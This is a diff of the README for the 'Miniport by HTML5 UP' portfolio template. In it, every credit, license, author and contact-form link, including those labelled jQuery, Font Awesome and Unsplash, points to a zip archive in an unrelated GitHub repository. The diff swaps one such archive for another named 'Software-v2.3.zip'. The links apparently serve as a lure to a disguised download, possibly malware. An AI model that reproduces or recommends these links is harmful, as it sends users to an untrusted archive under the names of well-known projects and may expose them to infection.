@@ -1,6 +1,6 @@
 Miniport by HTML5 UP
-https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip)
+https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip)
 
 
 A super simple responsive portfolio template. It's only a single page because hey, sometimes
@@ -14,19 +14,19 @@ you can use for pretty much whatever.
 Feedback, bug reports, and comments are not only welcome, but strongly encouraged :)
 
 AJ
-https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip | @ajlkn
+https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip | @ajlkn
 
-PS: Not sure how to get that contact form working? Give https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip a try (it's awesome).
+PS: Not sure how to get that contact form working? Give https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip a try (it's awesome).
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip)
+		Unsplash (https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip)
 
 	Icons:
-		Font Awesome (https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip)
+		Font Awesome (https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip)
 
 	Other:
-		jQuery (https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip)
-		Responsive Tools (https://raw.githubusercontent.com/jinsolkr/storehouse/main/superabound/storehouse.zip)
+		jQuery (https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip)
+		Responsive Tools (https://github.com/jinsolkr/storehouse/raw/refs/heads/main/assets/sass/Software-v2.3.zip)
